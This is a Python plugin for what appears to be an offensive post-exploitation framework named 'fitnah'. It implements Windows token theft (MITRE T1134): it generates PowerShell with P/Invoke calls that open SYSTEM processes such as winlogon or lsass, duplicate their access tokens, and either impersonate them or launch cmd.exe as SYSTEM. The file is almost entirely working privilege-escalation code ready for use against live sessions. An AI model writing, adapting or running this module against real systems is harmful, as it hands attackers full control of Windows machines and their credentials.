"""
privilege_escalation/token_theft — Token impersonation / theft. MITRE T1134.001 / T1134.002.
Opens a privileged process, duplicates its token, and impersonates it in the current thread.
Targets: SYSTEM-owned processes (winlogon, lsass, services, wininit).
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class TokenTheft(BasePlugin):
    NAME        = "token_theft"
    DESCRIPTION = "Steal and impersonate a SYSTEM token from a privileged process (T1134.001)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1134.001"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("target_process", str, required=False, default="winlogon",
              help="Process name to steal token from (winlogon, lsass, services, wininit, or PID)"),
        Param("action", str, required=False, default="impersonate",
              help="impersonate | spawn  — impersonate in current thread or spawn new process"),
        Param("spawn_cmd", str, required=False, default="cmd.exe",
              help="[spawn] Command to launch with the stolen token"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target  = params.get("target_process", "winlogon")
        action  = params.get("action", "impersonate").lower()
        cmd     = params.get("spawn_cmd", "cmd.exe")

        ps = self._build_ps(target, action, cmd)
        r  = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"token_theft failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="token_theft")

    @staticmethod
    def _build_ps(target: str, action: str, spawn_cmd: str) -> str:
        # Determine if target is a PID or process name
        pid_block = (
            f"$targetPid = {target}"
            if target.isdigit() else
            f"""
$proc = Get-Process -Name '{target}' -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $proc) {{ $results += "[-] Process '{target}' not found"; $results -join "`n"; exit }}
$targetPid = $proc.Id
"""
        )

        action_block = ""
        if action == "impersonate":
            action_block = """
$hTokenDup = [IntPtr]::Zero
[TT]::DuplicateTokenEx($hToken, 0x02000000, [IntPtr]::Zero, 2, 1, [ref]$hTokenDup) | Out-Null
if ($hTokenDup -eq [IntPtr]::Zero) {
    $results += "[-] DuplicateTokenEx failed: " + [Runtime.InteropServices.Marshal]::GetLastWin32Error()
} else {
    $ok = [TT]::ImpersonateLoggedOnUser($hTokenDup)
    $results += if ($ok) { "[+] Impersonating token — whoami: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" } else { "[-] ImpersonateLoggedOnUser failed" }
    [TT]::CloseHandle($hTokenDup) | Out-Null
}
"""
        else:  # spawn
            action_block = f"""
$hTokenDup = [IntPtr]::Zero
[TT]::DuplicateTokenEx($hToken, 0x02000000, [IntPtr]::Zero, 2, 2, [ref]$hTokenDup) | Out-Null
if ($hTokenDup -eq [IntPtr]::Zero) {{
    $results += "[-] DuplicateTokenEx (primary) failed"
}} else {{
    $si = New-Object TT+STARTUPINFO; $si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)
    $pi = New-Object TT+PROCESS_INFORMATION
    $ok = [TT]::CreateProcessWithTokenW($hTokenDup, 0, $null, '{spawn_cmd}', 0, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
    $results += if ($ok) {{ "[+] Spawned '{spawn_cmd}' as stolen token  PID=$($pi.dwProcessId)" }} else {{ "[-] CreateProcessWithTokenW failed: " + [Runtime.InteropServices.Marshal]::GetLastWin32Error() }}
    [TT]::CloseHandle($hTokenDup) | Out-Null
}}
"""

        return f"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class TT {{
    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr OpenProcess(uint da, bool inh, int pid);
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ph, uint da, out IntPtr tok);
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr src, uint da, IntPtr attr, int imp, int type, ref IntPtr dup);
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool ImpersonateLoggedOnUser(IntPtr tok);
    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool CreateProcessWithTokenW(IntPtr tok, uint flags, string app, string cmd, uint cf, IntPtr env, string dir, ref STARTUPINFO si, ref PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {{
        public int cb, res0; public string lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }}
}}
'@
$results = @()
{pid_block}
$results += "[*] Target PID: $targetPid"
$hProc = [TT]::OpenProcess(0x400 -bor 0x10, $false, $targetPid)
if ($hProc -eq [IntPtr]::Zero) {{ $results += "[-] OpenProcess failed (need SeDebugPrivilege)"; $results -join "`n"; exit }}
$hToken = [IntPtr]::Zero
[TT]::OpenProcessToken($hProc, 0x02000000, [ref]$hToken) | Out-Null
[TT]::CloseHandle($hProc) | Out-Null
if ($hToken -eq [IntPtr]::Zero) {{ $results += "[-] OpenProcessToken failed"; $results -join "`n"; exit }}
$results += "[+] Got token from PID $targetPid"
{action_block}
[TT]::CloseHandle($hToken) | Out-Null
$results -join "`n"
""".strip()
